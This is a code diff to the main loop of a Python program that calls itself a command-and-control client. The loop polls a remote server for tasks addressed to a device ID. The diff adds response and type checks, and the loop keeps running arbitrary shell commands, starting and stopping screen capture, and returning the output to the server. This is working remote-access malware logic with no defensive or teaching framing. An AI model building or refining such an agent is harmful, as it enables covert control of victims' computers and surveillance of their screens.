@@ -221,23 +221,30 @@ def main_loop(device_config):
     print(f"Starting C2 client for device {device_id}. Polling for commands...")
     while True:
         try:
-            tasks = _make_request("GET", f"/commands/{device_id}").json()
-            if tasks:
+            response = _make_request("GET", f"/commands/{device_id}")
+            response.raise_for_status()
+            tasks = response.json()
+
+            if tasks and isinstance(tasks, list): # Ensure tasks is a list
                 for task in tasks:
-                    task_id, command = task.get("id"), task.get("command")
-                    
-                    if command == "c2_screencap_start":
-                        start_screencap(device_id)
-                        submit_result(device_id, task_id, "Screen capture started.")
-                    elif command == "c2_screencap_stop":
-                        stop_screencap()
-                        submit_result(device_id, task_id, "Screen capture stopped.")
-                    elif command.startswith("c2_"):
-                        output = execute_c2_command(command)
-                        submit_result(device_id, task_id, output)
-                    else:
-                        output = execute_shell_command(command)
-                        submit_result(device_id, task_id, output)
+                    if isinstance(task, dict): # Ensure each item in tasks is a dict
+                        task_id, command = task.get("id"), task.get("command")
+                        if task_id is not None and command is not None:
+                            if command == "c2_screencap_start":
+                                start_screencap(device_id)
+                                submit_result(device_id, task_id, "Screen capture started.")
+                            elif command == "c2_screencap_stop":
+                                stop_screencap()
+                                submit_result(device_id, task_id, "Screen capture stopped.")
+                            elif command.startswith("c2_"):
+                                output = execute_c2_command(command)
+                                submit_result(device_id, task_id, output)
+                            else:
+                                output = execute_shell_command(command)
+                                submit_result(device_id, task_id, output)
+                        # else: Silently ignore tasks missing 'id' or 'command'
+                    # else: Silently ignore malformed tasks that are not dictionaries
+            # else: tasks is empty, or not a list, or None. Do nothing.
         except Exception as e:
             print(f"Error in main loop: {e}")
         time.sleep(10)
